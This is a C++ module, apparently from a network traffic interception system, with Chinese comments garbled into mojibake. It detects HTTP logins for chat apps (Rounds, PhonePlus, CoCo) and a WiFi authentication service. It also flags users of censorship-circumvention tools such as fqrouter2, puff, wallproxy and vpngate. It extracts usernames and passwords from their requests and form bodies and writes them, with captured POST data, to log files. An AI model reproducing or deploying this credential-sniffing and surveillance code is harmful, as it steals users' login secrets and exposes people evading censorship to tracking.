
#include "StdAfx.h"

#include "RunningQianXun.h"

#include "../BoundaryParser.h"
time_t running::QianXun::momo_last_time_ = 0;
time_t running::CoCo::momo_last_time_ = 0;

running::QianXun::QianXun(HttpSession *http_session, const string &pro_name) : Running(http_session,pro_name)
{
	
}

running::QianXun::~QianXun()
{
	
}

int running::QianXun::IsQianXun(HttpSession *http_session)
{
	/*
	if( ( http_session->m_Requestline.m_Host.Find("img.momocdn.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/album") != -1))
	{
		return 1;//momo
	}
*/

	if( ( http_session->m_Requestline.m_Host.Find("120.24.59.237")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/wifi/wifiAuthentication.php") != -1))
	{
		return 1;//wifi
	}
	
	// ÁÄÌìÈí¼þ Rounds
	if ( (http_session->m_Requestline.m_Host.Find("events.rounds.com") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/collect/ricapi-events") != -1))
	{
		return 2;//rounds
	}
	// ÁÄÌìÈí¼þ phoneplus
	if ( (http_session->m_Requestline.m_Host.Find("dl.phoneplus.langma.cn") != -1) && 
		( http_session->m_Requestline.m_URI.Find("/download_client_pack.php") != -1))
	{
		return 3;
	}


	// fqrouter2 ·­Ç½Èí¼þ  
	if (( http_session->m_Requestline.m_URI.Find("/AppConfig/GetNewLink.php?&group=fqrouter2") != -1))
	{	
		return 4;
	}
	// puff ·­Ç½Èí¼þ  
	if (( http_session->m_Requestline.m_URI.Find("/AppConfig/GetNewLink.php?&group=puff") != -1))
	{	
		return 5;
	}
	// wallproxy ·­Ç½Èí¼þ  
	if (( http_session->m_Requestline.m_URI.Find("/AppConfig/GetNewLink.php?&group=wallproxy") != -1))
	{	
		return 6;
	}
	// vpngate ·­Ç½Èí¼þ  
	if (( http_session->m_Requestline.m_URI.Find("/AppConfig/GetNewLink.php?&group=vpngate") != -1))
	{	
		return 7;
	}


	if (( http_session->m_Requestline.m_URI.Find("/AppConfig/chekuser.php?userid=") != -1))
	{
		return 8;
	}



	return 0;
}


int running::QianXun::Process(const char *packet,int action)
{

	if (action == 1)
	{

		string data = GetPostData_tmp(packet);
		ms_->Replace(data,"data=","");
		CString filename;
		filename.Format("e:\\appserv\\www\\wifimac\\%d.txt",rand());
		FILE *fp = fopen(filename,"w");
		if (fp)
		{
			fwrite(data.c_str(),1,data.size(),fp);
			fclose(fp);
		}
		
	}
	// rounds
	if (action == 2)
	{
		output_text_ = 	"state=µÇÂ¼\r\n";
		pro_name_ = "IMSG_ROUNDS";
		WriteIndexFile();
		return 1;
	}
	// phoneplus
	if (action == 3)
	{
		output_text_ = 	"state=µÇÂ¼\r\n";
		pro_name_ = "IMSG_PHONEPLUS";
		WriteIndexFile();
		return 1;
	}

	// fqrouter ·­Ç½Èí¼þ 4
	static map<string,bool> mapFqRouter;
	// puff ·­Ç½Èí¼þ 5
	static map<string,bool> mapPuff;
	// wallproxy ·­Ç½Èí¼þ 6
	static map<string,bool> mapWallproxy;
	// vpngate ·­Ç½Èí¼þ 7
	static map<string,bool> mapVpngate;


	if (action == 4)
	{
		string& skey = http_session_->GetTCPSessionKey_std();
		mapFqRouter.insert(make_pair(skey, true));
	}
	
	if (action == 5)
	{
		string& skey = http_session_->GetTCPSessionKey_std();
		mapPuff.insert(make_pair(skey, true));
	}

	if (action == 6)
	{
		string& skey = http_session_->GetTCPSessionKey_std();
		mapWallproxy.insert(make_pair(skey, true));
	}

	if (action == 7)
	{
		string& skey = http_session_->GetTCPSessionKey_std();
		mapVpngate.insert(make_pair(skey, true));
	}
	
	if (action == 8)
	{
		string& skey = http_session_->GetTCPSessionKey_std();
		
		bool bWrite = false;

		if (mapFqRouter.find(skey) != mapFqRouter.end())
		{
			bWrite = true;
			pro_name_ = "FQROUTER2";
			mapFqRouter.erase(skey);
		}
		else if (mapPuff.find(skey) != mapPuff.end())
		{
			bWrite = true;
			pro_name_ = "PUFF";
			mapPuff.erase(skey);
		}
		else if (mapWallproxy.find(skey) != mapWallproxy.end())
		{
			bWrite = true;
			pro_name_ = "WALLPROXY";
			mapWallproxy.erase(skey);
		}
		else if (mapVpngate.find(skey) != mapVpngate.end())
		{
			bWrite = true;
			pro_name_ = "VPNGATE";
			mapVpngate.erase(skey);
		}

		if (bWrite)
		{
			string sUri = http_session_->m_Requestline.m_URI.GetBuffer(0);
			char* user_begin = strstr(sUri.c_str(), "userid=") + strlen("userid=");
			char* user_end   = strstr(user_begin, "&password=");
			
			char* pass_begin = user_end + strlen("&password=");
			char* pass_end   = strstr(pass_begin, "&");
			
			string& sUser = string(user_begin, user_end);
			string& sPass = string(pass_begin, pass_end);
			
			output_text_ = 	"state=µÇÂ¼\r\n";
			output_text_ += "user=";
			output_text_ += sUser + "\r\n";
			
			output_text_ += "pass=";
			output_text_ += sPass + "\r\n";
			
			WriteIndexFile();
		}
	}

	return 1;
}


running::CoCo::CoCo(HttpSession *http_session, const string &pro_name) : Running(http_session,pro_name)
{
	
}

running::CoCo::~CoCo()
{
	
}

int running::CoCo::IsCoCo(HttpSession *http_session)
{
	if( ( http_session->m_Requestline.m_Host.Find(".onetwosixone.com")  != -1 ) &&
		( http_session->m_Requestline.m_URI.Find("/user/login/cocoidlogin.json") != -1)  &&
		( !http_session->m_Requestline.m_strBoundary.IsEmpty()))
	{
		return 1;//wifi
	}

	return 0;
}


int running::CoCo::Process(const char *packet,int action)
{
	if (action == 1)
	{

		BoundaryParser bp;
		bp.Parse(packet,http_session_->m_datalen,http_session_->m_Requestline.m_strBoundary.GetBuffer(0));
		
		BoundaryValue *bv = NULL;
		bv = bp.GetBoundaryValue("name=\"account\"");
		
		if (bv == NULL)
		{
			return 0;
		}
		
		string account = ms_->UTF8ToGBK(ms_->UrlDecode(string(bv->ptr,bv->len)));
		ms_->Replace(account,"\r","");
		ms_->Replace(account,"\n","");
		
		bv = bp.GetBoundaryValue("name=\"password\"");
		
		if (bv == NULL)
		{
			return 0;
		}

		string password = ms_->UTF8ToGBK(ms_->UrlDecode(string(bv->ptr,bv->len)));
		ms_->Replace(account,"\r","");
		ms_->Replace(account,"\n","");


		output_text_ =
			"user=" + account + "\r\n" +
			"pass=" + password + "\r\n" +
			"state=µÇÂ¼\r\n";

		WriteIndexFile();
	}

	
	return 1;
}